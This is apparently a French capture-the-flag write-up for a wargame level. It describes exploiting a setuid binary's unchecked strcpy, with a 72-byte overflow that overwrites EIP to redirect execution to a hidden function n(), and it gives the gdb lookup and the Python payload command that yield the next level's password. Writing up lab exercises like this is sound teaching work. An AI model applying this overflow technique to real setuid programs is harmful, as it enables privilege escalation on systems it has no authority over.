## Comportement
- J'ai des droits `level6` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*`
- En exécutant le binaire (`./level6`), on observe:
  - qu'il attend un argument de notre part. (`./level6 hello`)
  - pour chaque argument passe il inscrit `Nope`.
  - sans argument, le programme segfault.


## Analyse
- Une fonction qui nous serait tres utile n'est jamais appelee : `n()`. Au lieu de cela un appel est fait a une autre fonction, qui nous est inutile : `m()`. Il faut overwrite l'appel a cette fonction.
- Utilisation de `strcpy()` qui est vulnerable si l'n ne check pas au prealable l'input de l'utilisateur. Ce qui est le cas ici. 


## Résolution
- On overwrite l'`eip` en trouvant son offset avec un pattern generator comme dans un precedent exercice. On obtient 72. 
- On trouve l'adresse de `n()`
  ```shell
    (gdb) info function n
    ...
    0x08048454  o
    ...
    (gdb)
  ```
- On craft notre payload:
  - avec l'adresse d'`n()` en little endian => `\x54\x84\x04\x08` (4 bytes)
  - et on l'integre comme premier argument puisque le programme en attend un sinon il crash.
  ```shell
  python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/payload
  ./level6 $(cat /tmp/payload)
  ```
- On obtient directement le password. Il nous reste plus qu'a passer au level7 (`su level7`) en renseignant ce password.
